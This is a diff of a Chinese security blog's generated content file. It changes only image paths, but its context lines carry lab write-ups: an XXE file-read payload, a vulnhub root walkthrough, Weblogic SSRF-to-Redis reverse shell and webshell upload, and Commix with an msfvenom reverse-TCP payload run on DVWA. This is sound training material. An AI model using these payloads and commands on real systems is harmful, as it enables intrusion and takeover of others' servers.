@@ -108,7 +108,7 @@
 <ul>
 <li><p>DTD文档类型定义</p>
 <p><strong>DTD</strong>的作用是定义<strong>XML</strong>文档的合法构建模块。<strong>DTD</strong>可以在<strong>XML</strong>文档内声明，也可以在外部声明。</p>
-<p><img src="%5Cimages%5CXXE_lab%5C1.jpg" alt="1"></p>
+<p><img src="/2019/07/25/XXE_LAB/%5Cimages%5CXXE_lab%5C1.jpg" alt="1"></p>
 <ol>
 <li><p><strong>内部声明</strong><code>&lt;!DOCTYPE   根元素   [元素声明]  &gt;</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;                   XML声明</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;           文档定义类型</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;&#x2F;to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;&#x2F;from&gt;                        文档元素</span><br><span class="line">  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
@@ -137,13 +137,13 @@
 <p>利用<a href="https://github.com/c0ny1/xxe-lab" target="_blank" rel="noopener">XXE-lab</a>来演示漏洞</p>
 <ul>
 <li><p>搭建好环境后访问，在登陆时抓包</p>
-<p><img src="%5Cimages%5CXXE_lab%5C2.jpg" alt="2"></p>
+<p><img src="/2019/07/25/XXE_LAB/%5Cimages%5CXXE_lab%5C2.jpg" alt="2"></p>
 <p>发现在登陆时允许解析XML内容。</p>
 </li>
 <li><p>验证该漏洞，发送如下请求</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE a [</span><br><span class="line"> 	&lt;!ENTITY  xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="%5Cimages%5CXXE_lab%5C3.jpg" alt="3"></p>
+<p><img src="/2019/07/25/XXE_LAB/%5Cimages%5CXXE_lab%5C3.jpg" alt="3"></p>
 <p>可以读到<code>win.ini</code>文件，故漏洞存在</p>
 </li>
 </ul>
@@ -177,58 +177,58 @@
 <li><p><strong>扫描</strong></p>
 <ul>
 <li><p><code>使用工具：netdiscover,nmap</code></p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C1.jpg" alt="1"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C1.jpg" alt="1"></p>
 <p>找到靶机的<strong>IP</strong>地址为<code>192.168.1.195</code></p>
 </li>
 <li><p>使用<strong>Nmap</strong>对端口进行扫描</p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C2.jpg" alt="2"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C2.jpg" alt="2"></p>
 <p>可以观察到有三个端口开放</p>
 </li>
 </ul>
 </li>
 <li><p><strong>对端口逐一测试</strong></p>
 <ul>
-<li><p>首先是<strong>80</strong>端口，尝试在浏览器中打开<strong>IP</strong>地址，但并未发现游泳的信息。<img src="%5Cimages%5CMachine_Matrix_v3%5C3.jpg" alt="3"></p>
+<li><p>首先是<strong>80</strong>端口，尝试在浏览器中打开<strong>IP</strong>地址，但并未发现游泳的信息。<img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C3.jpg" alt="3"></p>
 <ul>
-<li><p>使用<code>dirsearch</code>扫描目录<img src="%5Cimages%5CDesktop%5CMachine_Matrix_v3%5C4.jpg" alt="4"></p>
-<p>发现一个<code>/assets/目录</code>，在<code>/assets/img/</code>目录下发现了一个名为<code>Matrix_can-show-you-the-door.png</code>的图片<img src="%5Cimages%5CMachine_Matrix_v3%5C5.jpg" alt="5">图片内容为一只白色的兔子，正好与之前的80端口的标题<code>Follow the white rabbit</code>对应。<img src="%5Cimages%5CMachine_Matrix_v3%5C6.jpg" alt="6"></p>
+<li><p>使用<code>dirsearch</code>扫描目录<img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CDesktop%5CMachine_Matrix_v3%5C4.jpg" alt="4"></p>
+<p>发现一个<code>/assets/目录</code>，在<code>/assets/img/</code>目录下发现了一个名为<code>Matrix_can-show-you-the-door.png</code>的图片<img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C5.jpg" alt="5">图片内容为一只白色的兔子，正好与之前的80端口的标题<code>Follow the white rabbit</code>对应。<img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C6.jpg" alt="6"></p>
 </li>
-<li><p>根据图片名字的提示将<code>Matrix</code>作为目录名字得到了更多的提示<img src="%5Cimage%5CMachine_Matrix_v3%5C7.jpg" alt="7">)由于<code>Matrix</code>电影（黑客帝国）中主角演员的名字为<code>neo</code>所以将<strong>neo</strong>作为路径名，只有<strong>4</strong>和<strong>6</strong>俩个数字所以将其组合尝试，找到了<code>secret.gz</code>文件。<img src="%5Cimage%5CMachine_Matrix_v3%5C8.jpg" alt="8">)经查看改文件其实为<code>txt</code>文件，包含了用户名和密码<img src="%5Cimages%5CMachine_Matrix_v3%5C9.jpg" alt="9"></p>
+<li><p>根据图片名字的提示将<code>Matrix</code>作为目录名字得到了更多的提示<img src="/2019/07/21/Machine_Matrix_v3/%5Cimage%5CMachine_Matrix_v3%5C7.jpg" alt="7">)由于<code>Matrix</code>电影（黑客帝国）中主角演员的名字为<code>neo</code>所以将<strong>neo</strong>作为路径名，只有<strong>4</strong>和<strong>6</strong>俩个数字所以将其组合尝试，找到了<code>secret.gz</code>文件。<img src="/2019/07/21/Machine_Matrix_v3/%5Cimage%5CMachine_Matrix_v3%5C8.jpg" alt="8">)经查看改文件其实为<code>txt</code>文件，包含了用户名和密码<img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C9.jpg" alt="9"></p>
 <p>对密码进行<code>md5</code>解密得到<code>passwd</code>，在扫描端口时发现<code>7331</code>端口下的是一个受身份验证保护的服务，猜测刚刚的到账号密码可能会派上用场。</p>
 </li>
 </ul>
 </li>
 <li><p>查看<code>7331</code>端口下的内容</p>
 <ul>
-<li><p>使用刚刚的账号密码成功登陆 <img src="%5Cimages%5CMachine_Matrix_v3%5C10.jpg" alt="10"></p>
+<li><p>使用刚刚的账号密码成功登陆 <img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C10.jpg" alt="10"></p>
 <p>又是一个提示的页面</p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C11.jpg" alt="11"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C11.jpg" alt="11"></p>
 <ul>
 <li>再次使用<code>dirb</code>扫描目录</li>
 </ul>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C12.jpg" alt="12"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C12.jpg" alt="12"></p>
 <p>在文件目录中发现了一个名为<code>data</code>的文件</p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C14.jpg" alt="14"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C14.jpg" alt="14"></p>
 <ul>
-<li>在<strong>ida</strong>中打开<strong>data</strong>文件，发现一个用户名和密码<br><img src="%5Cimages%5CMachine_Matrix_v3%5C15.jpg" alt="15"></li>
+<li>在<strong>ida</strong>中打开<strong>data</strong>文件，发现一个用户名和密码<br><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C15.jpg" alt="15"></li>
 </ul>
 </li>
 </ul>
 </li>
 <li><p>猜测可能为<code>6464</code>端口上运行的<strong>SSH</strong>服务的账号和密码，尝试登陆</p>
 <ul>
-<li><p><img src="%5Cimages%5CMachine_Matrix_v3%5C16.jpg" alt="16"></p>
+<li><p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C16.jpg" alt="16"></p>
 <p>但是在发现是一个受到限制的<strong>shell(rbash)</strong>，所以此处需要运行带有<strong>noprofile</strong>扩展的<strong>ssh</strong></p>
 <blockquote>
 <p><strong>rbash</strong>限制任何启动文件被读取后执行。</p>
 </blockquote>
 </li>
 <li><p>ssh <a href="mailto:guest@192.168.1.195">guest@192.168.1.195</a> -p 6464 -t “bash –noprofile”</p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C17.jpg" alt="17"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C17.jpg" alt="17"></p>
 <p>在该<strong>shell</strong>中可以执行<strong>sudo</strong>命令</p>
 </li>
 <li><p>检查<strong>guest</strong>用户的<strong>sudo</strong>权限，我们发现该用户可以使用其他用户<strong>trinity</strong>权限运行<strong>/ bin / cp</strong></p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C23.jpg" alt="23"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C23.jpg" alt="23"></p>
 </li>
 </ul>
 </li>
@@ -239,22 +239,22 @@
 <li><p><strong>提权</strong></p>
 <ul>
 <li><p>我们需要做的是创建一个新的<strong>ssh</strong>密钥，为<strong>id_rsa.pub</strong>文件提供了读写执行权限，然后将其复制到相应的位置。</p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C18.jpg" alt="18"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C18.jpg" alt="18"></p>
 </li>
 </ul>
 </li>
 </ul>
 <ul>
 <li><p>利用<strong>sudo</strong>权限复制<strong>/home/trinity/.ssh/authorized_keys</strong>文件夹中的<strong>id_rsa.pub</strong>文件，然后可以使用<strong>id_rsa</strong>键访问<code>trinity</code>用户的<strong>ssh</strong></p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C19.jpg" alt="19"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C19.jpg" alt="19"></p>
 </li>
 <li><p>检查<code>trinity</code>的<strong>sudo</strong>权限时发现它可以执行具有<strong>root</strong>权限的<strong>oracle</strong>文件。、</p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C20.jpg" alt="20"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C20.jpg" alt="20"></p>
 <p>但是在<code>/home/trinity/</code>目录中并没有名为<code>oracle</code>的文件，因此我们使用<strong>echo</strong>命令创建带有<strong>/bin/sh</strong>的<strong>oracle</strong>文件</p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C21.jpg" alt="21"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C21.jpg" alt="21"></p>
 </li>
 <li><p>使用<strong>sudo</strong>命令执行<strong>oracle</strong>文件，得到<strong>root shell</strong></p>
-<p><img src="%5Cimages%5CMachine_Matrix_v3%5C22.jpg" alt="22"></p>
+<p><img src="/2019/07/21/Machine_Matrix_v3/%5Cimages%5CMachine_Matrix_v3%5C22.jpg" alt="22"></p>
 </li>
 </ul>
 ]]></content>
@@ -275,7 +275,7 @@
 <p>Oracle@123 </p>
 </blockquote>
 <p>可以采用intruder爆力破解，成功后即可上传<strong>war</strong>包<strong>getshell</strong></p>
-<p><img src="%5Cimages%5CWeblogic%5C1.jpg" alt="1"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C1.jpg" alt="1"></p>
 <h4 id="0x02：Weblogic-SSRF漏洞"><a href="#0x02：Weblogic-SSRF漏洞" class="headerlink" title="0x02：Weblogic SSRF漏洞"></a>0x02：Weblogic SSRF漏洞</h4><p><strong>Weblogic</strong>中存在一个SSRF漏洞，利用该漏洞可以发送任意<strong>HTTP</strong>请求，进而攻击内网中<strong>redis、fastcgi</strong>等脆弱组件。</p>
 <p><strong>SSRF</strong>漏洞存在<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
 <p>在<strong>Burp</strong>中测试该漏洞</p>
@@ -283,37 +283,37 @@
 <li>向服务器发送<strong>GET</strong>请求：</li>
 </ul>
 <p><code>?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</code></p>
-<p><img src="%5Cimages%5CWeblogic%5C2.png" alt="2"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C2.png" alt="2"></p>
 <ul>
 <li><p>若发送一个不存在的端口：</p>
-<p><img src="%5Cimages%5CWeblogic%5C3.png" alt="3"></p>
-<p>返回值为：<img src="%5Cimages%5CWeblogic%5C4.png" alt="4"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C3.png" alt="3"></p>
+<p>返回值为：<img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C4.png" alt="4"></p>
 </li>
 <li><p>可以通过返回的信息不同，来判断端口开放的状态。</p>
 </li>
 </ul>
 <ol>
-<li><p><strong>存在的IP地址：</strong><img src="%5Cimages%5CWeblogic%5C2.png" alt="2"></p>
+<li><p><strong>存在的IP地址：</strong><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C2.png" alt="2"></p>
 </li>
 <li><p><strong>不存在的IP地址：</strong></p>
-<p><img src="%5Cimages%5CWeblogic%5C5.png" alt="5"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C5.png" alt="5"></p>
 </li>
 </ol>
 <ol start="3">
-<li><p><strong>存在IP但没有打开的端口：</strong><img src="%5Cimages%5CWeblogic%5C4.png" alt="4"></p>
+<li><p><strong>存在IP但没有打开的端口：</strong><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C4.png" alt="4"></p>
 </li>
 <li><p><strong>存在IP且端口也存在：</strong></p>
-<p><img src="%5Cimages%5CWeblogic%5C2.png" alt="2"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C2.png" alt="2"></p>
 </li>
 </ol>
-<p><img src="%5Cimages%5CWeblogic%5C9.png" alt="9"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C9.png" alt="9"></p>
 <ul>
 <li><strong>注入HTTP头，利用Redis反弹shell：</strong></li>
 </ul>
 <p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
 <p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现<code>172.18.0.2:6379</code>可以连通：</p>
 <p>其返回值符合端口可联通的特征：</p>
-<p><img src="%5Cimages%5CWeblogic%5C6.png" alt="6"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C6.png" alt="6"></p>
 <ol>
 <li><p>发送<strong>Redis</strong>命令，将反弹shell的脚本写入<code>/etc/crontab/</code></p>
 <blockquote>
@@ -323,7 +323,7 @@
 </li>
 <li><p>进行<strong>URL</strong>编码后将 其放在<strong>SSRF</strong>的域名后，使用<strong>GET</strong>方式发送该数据后即可获得<strong>shell</strong></p>
 <p><strong>换行符是“\r\n”，也就是“%0D%0A”</strong></p>
-<p><img src="%5Cimages%5CWeblogic%5C7.png" alt="7"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C7.png" alt="7"></p>
 </li>
 <li><p>对于crond利用：</p>
 </li>
@@ -346,7 +346,7 @@
 </li>
 </ul>
 <h4 id="0x03：Weblogic-任意文件读取漏洞"><a href="#0x03：Weblogic-任意文件读取漏洞" class="headerlink" title="0x03：Weblogic 任意文件读取漏洞"></a><strong>0x03：Weblogic 任意文件读取漏洞</strong></h4><p>在该环境中访问<code>http://your-ip:7001/hello/file.jsp?path=/etc/passwd</code>即可成功读取<strong>password</strong>文件</p>
-<p><img src="%5Cimages%5CWeblogic%5C8.png" alt="8"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C8.png" alt="8"></p>
 <p>以下是对该漏洞的进一步利用。</p>
 <ul>
 <li><strong>读取后台用户密文与密钥文件：</strong></li>
@@ -369,15 +369,15 @@
 <li><p>点击<strong>安全</strong>，添加中上传<strong>webshell</strong></p>
 </li>
 </ul>
-<p><img src="%5Cimages%5CWeblogic%5C10.png" alt="10"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C10.png" alt="10"></p>
 <ul>
 <li>观察返回数据包中的时间戳：</li>
 </ul>
-<p><img src="%5Cimages%5CWeblogic%5C11.png" alt="11"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C11.png" alt="11"></p>
 <ul>
 <li>然后访问<code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行<strong>webshell</strong></li>
 </ul>
-<p><img src="%5Cimages%5CWeblogic%5C12.png" alt="12"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C12.png" alt="12"></p>
 <h4 id="Weblogic-XMLDecoder-反序列化漏洞-（CVE-2017-10271）"><a href="#Weblogic-XMLDecoder-反序列化漏洞-（CVE-2017-10271）" class="headerlink" title="Weblogic XMLDecoder 反序列化漏洞 （CVE-2017-10271）"></a>Weblogic XMLDecoder 反序列化漏洞 （CVE-2017-10271）</h4><p><strong>Weblogic</strong>的<strong>WLS Security</strong>组件对外提供<strong>webservice</strong>服务，其中使用了<strong>XMLDecoder</strong>来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
 <ul>
 <li>访问<code>/wls-wsat/CoordinatorPortType</code>发送一下数据包</li>
@@ -387,9 +387,9 @@
 <ul>
 <li><strong>执行效果</strong></li>
 </ul>
-<p><img src="%5Cimages%5CWeblogic%5C13.png" alt="13"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C13.png" alt="13"></p>
 <p><strong>获取shell</strong></p>
-<p><img src="%5Cimages%5CWeblogic%5C14.png" alt="14"></p>
+<p><img src="/2019/05/24/Weblogic/%5Cimages%5CWeblogic%5C14.png" alt="14"></p>
 <ul>
 <li><strong>写入Webshell：</strong></li>
 </ul>
@@ -418,27 +418,27 @@
 <p>若端口为开放状态，服务端就会收到一个SYN后返回SYN+ACK，此时只需要返回一个ACK+RST完成三次握手并重置连接即可。</p>
 <a id="more"></a>
 
-<p><img src="%5Cimages%5Cportscan%5C1.jpg" alt="1"></p>
+<p><img src="/2019/05/22/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/%5Cimages%5Cportscan%5C1.jpg" alt="1"></p>
 <p>若目标端口处于关闭状态，服务端则会返回RST重置连接。</p>
-<p><img src="%5Cimages%5Cportscan%5C2.jpg" alt="2"></p>
+<p><img src="/2019/05/22/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/%5Cimages%5Cportscan%5C2.jpg" alt="2"></p>
 </li>
 <li><p><strong>SYN 扫描</strong></p>
 <p>这种技术通常认为是“半开放”扫描，如果目标端口开放时，只返回 <strong>RST</strong> 数据包，而不返回 <strong>ACK+RST</strong>（躲避防火墙的探测）</p>
-<p><img src="%5Cimages%5Cportscan%5C3.jpg" alt="3"></p>
+<p><img src="/2019/05/22/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/%5Cimages%5Cportscan%5C3.jpg" alt="3"></p>
 </li>
 <li><p><strong>TCP 空扫描(Null)</strong></p>
-<p>数据包<strong>flags</strong>标识位全都不设置，若扫描主机是<code>windows</code>系统，不管端口开放情况，都会回复<strong>RST</strong>包。若扫描主机是<code>linux</code>系统，若端口开放，则不回复。 若端口关闭，则回复<strong>RST</strong>包。可以探测操作系统。<br><img src="%5Cimages%5Cportscan%5C4.jpg" alt="4"></p>
-<p><img src="%5Cimages%5Cportscan%5C5.jpg" alt="5"></p>
+<p>数据包<strong>flags</strong>标识位全都不设置，若扫描主机是<code>windows</code>系统，不管端口开放情况，都会回复<strong>RST</strong>包。若扫描主机是<code>linux</code>系统，若端口开放，则不回复。 若端口关闭，则回复<strong>RST</strong>包。可以探测操作系统。<br><img src="/2019/05/22/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/%5Cimages%5Cportscan%5C4.jpg" alt="4"></p>
+<p><img src="/2019/05/22/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/%5Cimages%5Cportscan%5C5.jpg" alt="5"></p>
 <p><strong>如果收到ICMP数据包则说明被过滤</strong></p>
-<p><img src="%5Cimages%5Cportscan%5C6.jpg" alt="6"></p>
+<p><img src="/2019/05/22/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/%5Cimages%5Cportscan%5C6.jpg" alt="6"></p>
 </li>
 <li><p><strong>TCP Xmas Tree（圣诞树）扫描</strong></p>
 <p> 圣诞树扫描的原理是，客户端向服务端发送带有<strong>PSH,FIN,URG</strong>标识和端口号的数据包，如果端口开放，则服务端不会有任何的响应。</p>
 </li>
 </ol>
-<p>​    <img src="%5Cimages%5Cportscan%5C7.jpg" alt="7"></p>
+<p>​    <img src="/2019/05/22/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/%5Cimages%5Cportscan%5C7.jpg" alt="7"></p>
 <p>  如果服务器返回一个<strong>RST</strong>数据包，则表明端口处于关闭状态。</p>
-<p>​    <img src="%5Cimages%5Cportscan%5C8.jpg" alt="8"></p>
+<p>​    <img src="/2019/05/22/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/%5Cimages%5Cportscan%5C8.jpg" alt="8"></p>
 <p>  同样的若收到返回的<strong>ICMP</strong>数据包则表明数据包被过滤。</p>
 <ol start="5">
 <li><p><strong>TCP Xmas Tree（圣诞树）扫描</strong></p>
@@ -450,7 +450,7 @@
 </ol>
 <p>使用TCP ACK扫描不能够确定端口的关闭或者开放，因为当发送给对方一个含有ACK表示的TCP报文的时候，无论端口是开放或者关闭，都返回含有RST标志的报文。所以不能使用TCP ACK扫描来确定端口是否开放或者关闭。但是可以利用它来扫描防火墙的配置，用它来发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。</p>
 <p><code>向服务端发送一个带有 ACK 标识的数据包，如果收到带有 RST 标识的响应，则说明服务端没有过滤，不存在状态防火墙。</code></p>
-<p><img src="%5Cimages%5Cportscan%5C9.jpg" alt="9"></p>
+<p><img src="/2019/05/22/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/%5Cimages%5Cportscan%5C9.jpg" alt="9"></p>
 <ul>
 <li><strong>使用Python3实现端口扫描</strong></li>
 </ul>
@@ -469,34 +469,34 @@
 <p>Commix有各种命令选项，可以使用它们来查找目标应用程序并与之连接。</p>
 <a id="more"></a>
 
-<h5 id="Commix中的命令注入类型："><a href="#Commix中的命令注入类型：" class="headerlink" title="Commix中的命令注入类型："></a>Commix中的命令注入类型：</h5><p><font color=red><strong>基于结果的命令注入:</strong></font></p>
+<h5 id="Commix中的命令注入类型："><a href="#Commix中的命令注入类型：" class="headerlink" title="Commix中的命令注入类型："></a>Commix中的命令注入类型：</h5><p><font color="red"><strong>基于结果的命令注入:</strong></font></p>
 <p>这种类型的注入攻击允许通过Web应用程序的结果推断注入命令的结果</p>
 <ul>
 <li>基于经典结果的注入：这是最常用的命令注入，也是最简单的。使用几个常见的操作符将正确的命令与注入命令链接在一起，或者完全排除初始命令，然后继续执行注入的命令，进一步分为Shellcode，ICMP exfiltration ，DNS exfiltration。</li>
 <li>基于eval的技术：在目标Web应用程序易受eval()函数攻击的情况下使用此技术。该eval函数用于执行在运行时期间在所述函数中定义的特殊代码。</li>
 </ul>
-<p><font color=red><strong>盲命令注入:</strong></font></p>
+<p><font color="red"><strong>盲命令注入:</strong></font></p>
 <p>执行注入的shell命令后检索数据的方式是俩种类型的工作之间的主要区别，在Web应用程序下不向攻击者提供任何结果的情况下没使用盲命令注入</p>
 <ul>
 <li>基于时间技术：延迟执行注入命令的时间。通过检查应用程序回复所花费的时间将使攻击者能够确定命令是否成功执行。</li>
 <li>基于文件的技术：如果无法通过反应来确定Web应用程序的结果，则使用该方法。将允许编写要在文件中可访问的命令集。</li>
 </ul>
-<h5 id="在DVWA上进行测试"><a href="#在DVWA上进行测试" class="headerlink" title="在DVWA上进行测试"></a>在DVWA上进行测试</h5><p><img src="%5Cimages%5Ccommix%5C1.jpg" alt="1"></p>
+<h5 id="在DVWA上进行测试"><a href="#在DVWA上进行测试" class="headerlink" title="在DVWA上进行测试"></a>在DVWA上进行测试</h5><p><img src="/2019/03/24/Commix/%5Cimages%5Ccommix%5C1.jpg" alt="1"></p>
 <ul>
 <li>使用Burp抓包获取到cookie</li>
 </ul>
-<p><img src="%5Cimages%5Ccommix%5C2.jpg" alt="2"></p>
+<p><img src="/2019/03/24/Commix/%5Cimages%5Ccommix%5C2.jpg" alt="2"></p>
 <ul>
 <li>使用参数<code>-cookie和-data</code>来验证会话，用这俩个参数发送数据字符串，以便利用POST方法并同时验证会话</li>
 </ul>
 <p>命令：<code>commix -u http://192.168.1.38/DVWA/vulnerabilities/exec/ --cookie=&quot;PHPSESSID=pine68kenlqols1k12vobglj81&quot; --data=&quot;ip=192.168.1.38&amp;Submit=Submit&quot;</code></p>
 <p>会获得以下会话：</p>
-<p><img src="%5Cimages%5Ccommix%5C3.jpg" alt="3"></p>
+<p><img src="/2019/03/24/Commix/%5Cimages%5Ccommix%5C3.jpg" alt="3"></p>
 <ul>
 <li>使用msfvenom创建恶意文件</li>
 </ul>
 <p><code>msfvenom -p python/meteroreter/reverse_tcp lhost=192.168.1.44 lport=1234 -f raw &gt;venom.py</code></p>
-<p><img src="%5Cimages%5Ccommix%5C4.jpg" alt="4"></p>
+<p><img src="/2019/03/24/Commix/%5Cimages%5Ccommix%5C4.jpg" alt="4"></p>
 <ul>
 <li><p>将恶意文件上传到目标并运行</p>
 <p><code>commix -u http://192.168.1.38/DVWA/vulnerabilities/exec/ cookie=&quot;PHPSESSID=pine68kenlqols1k12vobglj81&quot; --data=&quot;ip=192.168.1.38&amp;Submit=Submit&quot; --file-write=&quot;/root/venom.py&quot; --file-dest=&quot;/tmp/venom.py&quot; --os-cmd=&quot;python /tmp/venom.py&quot;</code></p>
@@ -515,35 +515,35 @@
     <title>unknowndevice靶机测试</title>
     <url>/2019/03/20/unknowndevice/</url>
     <content><![CDATA[<p>首先拿到该靶机，目标是获得root权限</p>
-<p><img src="%5Cimages%5Cunknowndevice%5C1.jpg" alt="1"></p>
+<p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C1.jpg" alt="1"></p>
 <a id="more"></a>
 
-<h5 id="第一步探测IP："><a href="#第一步探测IP：" class="headerlink" title="第一步探测IP："></a>第一步探测IP：</h5><p><img src="%5Cimages%5Cunknowndevice%5C2.jpg" alt="2"></p>
+<h5 id="第一步探测IP："><a href="#第一步探测IP：" class="headerlink" title="第一步探测IP："></a>第一步探测IP：</h5><p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C2.jpg" alt="2"></p>
 <p>目标IP-&gt;192.168.2.137</p>
-<h5 id="下一步使用nmap探测端口"><a href="#下一步使用nmap探测端口" class="headerlink" title="下一步使用nmap探测端口"></a>下一步使用nmap探测端口</h5><p><img src="%5Cimages%5Cunknowndevice%5C3.jpg" alt="3"></p>
+<h5 id="下一步使用nmap探测端口"><a href="#下一步使用nmap探测端口" class="headerlink" title="下一步使用nmap探测端口"></a>下一步使用nmap探测端口</h5><p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C3.jpg" alt="3"></p>
 <p>只有俩个端口正在运行，发现31337端口正在运行HTTP服务，访问该端口</p>
-<h5 id="在该页面中发现了一个字符串可能是某个密码"><a href="#在该页面中发现了一个字符串可能是某个密码" class="headerlink" title="在该页面中发现了一个字符串可能是某个密码"></a>在该页面中发现了一个字符串可能是某个密码</h5><p><img src="%5Cimages%5Cunknowndevice%5C4.jpg" alt="4"></p>
-<h5 id="查看源代码发现有一张图片，下载到本地，有可能使用了隐写术"><a href="#查看源代码发现有一张图片，下载到本地，有可能使用了隐写术" class="headerlink" title="查看源代码发现有一张图片，下载到本地，有可能使用了隐写术"></a>查看源代码发现有一张图片，下载到本地，有可能使用了隐写术</h5><p><img src="%5Cimages%5Cunknowndevice%5C5.jpg" alt="5"></p>
+<h5 id="在该页面中发现了一个字符串可能是某个密码"><a href="#在该页面中发现了一个字符串可能是某个密码" class="headerlink" title="在该页面中发现了一个字符串可能是某个密码"></a>在该页面中发现了一个字符串可能是某个密码</h5><p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C4.jpg" alt="4"></p>
